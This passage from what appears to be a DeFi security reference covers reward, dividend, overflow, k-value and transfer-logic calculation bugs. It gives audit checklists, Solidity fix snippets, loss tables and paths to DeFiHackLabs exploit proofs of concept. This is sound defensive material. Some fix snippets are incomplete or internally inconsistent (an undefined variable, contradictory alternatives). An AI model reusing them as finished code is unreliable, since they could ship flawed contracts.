- [ ] Is k-value validated after swap callback completes?
- [ ] Can sync() be called after balance manipulation?
- [ ] Does swap function properly validate invariant?

**Transfer Logic:**
- [ ] What happens on transfer(self, 0)?
- [ ] Do fees/burns affect pair balance unexpectedly?
- [ ] Can skim() be abused after transfer?

---

## Secure Implementation

### Fix 1: Internal Balance Tracking for Rewards

```solidity
// ✅ SECURE: Track internal state, don't rely on balanceOf
mapping(address => uint256) private _stakedBalance;
uint256 private _totalStaked;

function deposit(uint256 amount) external {
    uint256 balanceBefore = stakingToken.balanceOf(address(this));
    stakingToken.transferFrom(msg.sender, address(this), amount);
    uint256 actualReceived = stakingToken.balanceOf(address(this)) - balanceBefore;
    
    _stakedBalance[msg.sender] += actualReceived;  // Track actual received
    _totalStaked += actualReceived;
}

function calculateReward(address user) internal view returns (uint256) {
    // Use internal tracking, not external balance
    return (_stakedBalance[user] * rewardRate * timeDelta) / _totalStaked;
}
```

### Fix 2: Reward Debt Pattern (Dividend Protection)

```solidity
// ✅ SECURE: Track reward debt to prevent double claiming
mapping(address => uint256) public rewardDebt;
uint256 public accRewardPerShare;

function deposit(uint256 amount) external {
    _harvest(msg.sender);
    _stakedBalance[msg.sender] += amount;
    // Set debt to current accumulated - prevents claiming historical rewards
    rewardDebt[msg.sender] = (_stakedBalance[msg.sender] * accRewardPerShare) / 1e12;
}

function _harvest(address user) internal {
    uint256 pending = (_stakedBalance[user] * accRewardPerShare / 1e12) - rewardDebt[user];
    if (pending > 0) {
        rewardToken.transfer(user, pending);
    }
    rewardDebt[user] = (_stakedBalance[user] * accRewardPerShare) / 1e12;
}
```

### Fix 3: Proper K-Value Validation

```solidity
// ✅ SECURE: Validate k-value after callback
function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external {
    // ... transfer out tokens
    
    if (data.length > 0) {
        IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);
    }
    
    // Get balances AFTER callback
    uint256 balance0 = IERC20(token0).balanceOf(address(this));
    uint256 balance1 = IERC20(token1).balanceOf(address(this));
    
    // Validate k-value AFTER all operations complete
    uint256 balance0Adjusted = balance0 * 1000 - amount0In * 3;
    uint256 balance1Adjusted = balance1 * 1000 - amount1In * 3;
    require(balance0Adjusted * balance1Adjusted >= reserve0 * reserve1 * 1000**2, 'K');
}
```

### Fix 4: SafeMath / Checked Arithmetic

```solidity
// ✅ SECURE: Use SafeMath or Solidity 0.8.0+ checked math
function withdraw(uint256 amount) external {
    require(_balances[msg.sender] >= amount, "Insufficient balance");  // Check first
    _balances[msg.sender] -= amount;  // Then subtract (safe in 0.8.0+)
    // Or with SafeMath: _balances[msg.sender] = _balances[msg.sender].sub(amount);
}
```

### Fix 5: Anti-Gaming Delay for Donations

```solidity
// ✅ SECURE: Delay dividend accrual after donation
uint256 public lastDonationTime;
uint256 public constant DONATION_DELAY = 1 days;

function donate(uint256 amount) external {
    token.transferFrom(msg.sender, address(this), amount);
    pendingDonation += amount;
    lastDonationTime = block.timestamp;
}

function _updateDividends() internal {
    if (block.timestamp >= lastDonationTime + DONATION_DELAY && pendingDonation > 0) {
        accDividendPerShare += (pendingDonation * 1e12) / totalStaked;
        pendingDonation = 0;
    }
}
```

### Fix 6: Transfer Validation

```solidity
// ✅ SECURE: Validate transfer amounts and prevent self-transfer abuse
function _transfer(address from, address to, uint256 amount) internal {
    require(from != address(0) && to != address(0), "Invalid address");
    require(amount > 0, "Amount must be positive");
    
    // Prevent self-transfer abuse
    if (from == to) {
        return;  // No-op for self transfers
    }
    
    // Or restrict completely:
    require(from != to, "Self-transfer not allowed");
    
    // ... rest of transfer logic
}
```

---

## Real-World Loss Summary by Category

| Category | Protocols Affected | Total Losses | Key Insight |
|----------|-------------------|--------------|-------------|
| Reward Calculation | SWAPPStaking, LPMine, VTF, RL, DPC | ~$400K | Never use external balanceOf for reward math |
| Dividend Distribution | BankrollNetwork, Gangsterfinance | ~$100K | Delay dividend accrual after donations |
| Integer Overflow/Underflow | Umbrella, yETH, Pandora, LW | ~$10M | Always use checked arithmetic |
| K-Value Manipulation | LinkDAO, Swapos, YYDS | ~$1M | Validate k-value AFTER callbacks complete |
| Transfer Logic | HEALTH, PLTD, FireToken | ~$50K | Audit transfer hooks for side effects |
| Fee Calculation | AIZPT, DPC | ~$120K | Track claimed amounts, prevent re-entrancy |

---

## Keywords for Search

`incorrect calculation`, `reward calculation`, `dividend distribution`, `staking reward`, `reward per share`, `dividend per share`, `accRewardPerShare`, `rewardDebt`, `updateUserBalance`, `distributeAirdrop`, `donatePool`, `buyFor`, `integer overflow`, `integer underflow`, `SafeMath`, `unchecked`, `k value`, `constant product`, `pair manipulation`, `sync`, `skim`, `transfer logic`, `deflationary`, `burn on transfer`, `fee calculation`, `tax token`, `epoch`, `multiplier`, `claim reward`, `harvest`, `withdraw reward`

---

## Related Vulnerabilities

- [Precision Loss & Rounding](../precision/precision-loss-rounding-vulnerabilities.md) - Related arithmetic issues
- [Flash Loan Attacks](../flash-loan/flash-loan-attack-patterns.md) - Often combined with calculation exploits
- [Oracle Price Manipulation](../../oracle/price-manipulation/flash-loan-oracle-manipulation.md) - Similar economic attacks
- [Reentrancy](../reentrancy/defi-reentrancy-patterns.md) - Can enable repeated reward claims

---

## DeFiHackLabs Real-World Exploits (22 incidents)

**Category**: Calculation Errors, Reward Calculation | **Total Losses**: $51.6M | **Sub-variants**: 4

### Sub-variant Breakdown

#### Calculation-Errors/Generic (8 exploits, $51.0M)

- **Uranium** (2021-04, $50.0M, bsc) | PoC: `DeFiHackLabs/src/test/2021-04/Uranium_exp.sol`
- **Zeed Finance** (2022-04, $1.0M, bsc) | PoC: `DeFiHackLabs/src/test/2022-04/Zeed_exp.sol`
- **NowSwap Platform** (2021-09, $158, ethereum) | PoC: `DeFiHackLabs/src/test/2021-09/NowSwap_exp.sol`
- *... and 5 more exploits*

#### Reward-Calculation/Generic (11 exploits, $537K)

- **SNK** (2023-05, $197K, None) | PoC: `DeFiHackLabs/src/test/2023-05/SNK_exp.sol`
- **OSN** (2024-05, $109K, bsc) | PoC: `DeFiHackLabs/src/test/2024-05/OSN_exp.sol`
- **DPC** (2022-09, $104K, bsc) | PoC: `DeFiHackLabs/src/test/2022-09/DPC_exp.sol`
- *... and 8 more exploits*

#### Reward-Calculation/Unprotected Claim (1 exploits, $19K)

- **BTNFT** (2025-04, $19K, bsc) | PoC: `DeFiHackLabs/src/test/2025-04/BTNFT_exp.sol`

#### Reward-Calculation/Instant Rewards (2 exploits, $13K)

- **OKC Project** (2023-11, $6K, bsc) | PoC: `DeFiHackLabs/src/test/2023-11/OKC_exp.sol`
- **OKC Project** (2023-11, $6K, bsc) | PoC: `DeFiHackLabs/src/test/2023-11/OKC_exp.sol`

### Complete DeFiHackLabs Exploit Table

| Protocol | Date | Loss | Vulnerability Sub-type | Chain |
|----------|------|------|----------------------|-------|
| Uranium | 2021-04-28 | $50.0M | Miscalculation | bsc |
| Zeed Finance | 2022-04-21 | $1.0M | Incorrect calculation | bsc |
| SNK | 2023-05-10 | $197K | Reward Calculation Error | None |
| OSN | 2024-05-06 | $109K | Reward Distribution Problem | bsc |
| DPC | 2022-09-09 | $104K | Incorrect Reward calculation | bsc |
| VTF Token | 2022-10-27 | $50K | Incorrect Reward calculation | bsc |
| SWAPPStaking | 2025-07-24 | $32K | Incorrect Reward calculation | None |
| LPMine | 2025-01-08 | $24K | Incorrect reward calculation | bsc |
| BTNFT | 2025-04-18 | $19K | Claim Rewards Without Protection | bsc |
| Gangsterfinance | 2025-06-20 | $16K | Incorrect dividends | bsc |
| OKC Project | 2023-11-14 | $6K | Instant Rewards, Unlocked | bsc |
| OKC Project | 2023-11-14 | $6K | Instant Rewards, Unlocked | bsc |
| BankrollStack | 2025-06-19 | $5K | Incorrect dividends calculation | bsc |
| NowSwap Platform | 2021-09-15 | $158 | Incorrect calculation | ethereum |
| SNOOD | 2022-06-18 | $104 | Miscalculation on \_spendAllowance | ethereum |
| BankrollNetwork | 2025-06-19 | $24 | Incorrect dividends calculation | bsc |
| SorStaking | 2025-01-04 | $5 | Incorrect reward calculation | ethereum |
| Nimbus Platform | 2021-09-15 | $1 | Incorrect calculation | ethereum |
| PancakeHunny | 2021-06-03 | N/A | Incorrect calculation | bsc |
| BurgerSwap | 2021-05-27 | N/A | Mathematical flaw + Reentrancy | bsc |
| Cover Protocol | 2020-12-29 | N/A | Incorrect calculation via cached data | ethereum |
| RL Token | 2022-10-01 | N/A | Incorrect Reward calculation | bsc |

### Top PoC References

- **Uranium** (2021-04, $50.0M): `DeFiHackLabs/src/test/2021-04/Uranium_exp.sol`
- **Zeed Finance** (2022-04, $1.0M): `DeFiHackLabs/src/test/2022-04/Zeed_exp.sol`
- **SNK** (2023-05, $197K): `DeFiHackLabs/src/test/2023-05/SNK_exp.sol`
- **OSN** (2024-05, $109K): `DeFiHackLabs/src/test/2024-05/OSN_exp.sol`
- **DPC** (2022-09, $104K): `DeFiHackLabs/src/test/2022-09/DPC_exp.sol`
- **VTF Token** (2022-10, $50K): `DeFiHackLabs/src/test/2022-10/VTF_exp.sol`
- **SWAPPStaking** (2025-07, $32K): `DeFiHackLabs/src/test/2025-07/SWAPPStaking_exp.sol`
- **LPMine** (2025-01, $24K): `DeFiHackLabs/src/test/2025-01/LPMine_exp.sol`
- **BTNFT** (2025-04, $19K): `DeFiHackLabs/src/test/2025-04/BTNFT_exp.sol`
- **Gangsterfinance** (2025-06, $16K): `DeFiHackLabs/src/test/2025-06/Gangsterfinance_exp.sol`

### Detection Patterns

#### Code Patterns to Look For
```
- See vulnerable pattern examples above for specific code smells
- Check for missing validation on critical state-changing operations
- Look for assumptions about external component behavior
```

#### Audit Checklist
- [ ] Verify all state-changing functions have appropriate access controls
- [ ] Check for CEI pattern compliance on external calls
- [ ] Validate arithmetic operations for overflow/underflow/precision loss
- [ ] Confirm oracle data freshness and sanity checks

### Keywords for Search

> These keywords enhance vector search retrieval:

`_executeExploitSequence`, `_harvest`, `_transfer`, `_updateDividends`, `_withdraw`, `amm`, `approve`, `arithmetic`, `balanceOf`, `block.timestamp`, `burn`, `buy`, `buyFor`, `calculateReward`, `calculation`, `claim`, `defi`, `deposit`, `depositTo`, `dividend_calculation`, `dividends`, `dividendsOf`, `donate`, `donatePool`, `double`, `epoch_multiplier`, `incorrect_calculation`, `integer_overflow`, `integer_underflow`, `k_value_check`, `overflow`, `pair_balance_dependency`, `pool_donation`, `real_exploit`, `reward`, `reward_per_share`, `skim_function`, `staking`, `staking_balance`, `sync_function`, `time_based_reward`, `transfer`, `transfer_fee_logic`, `underflow`, `unsafe_math`
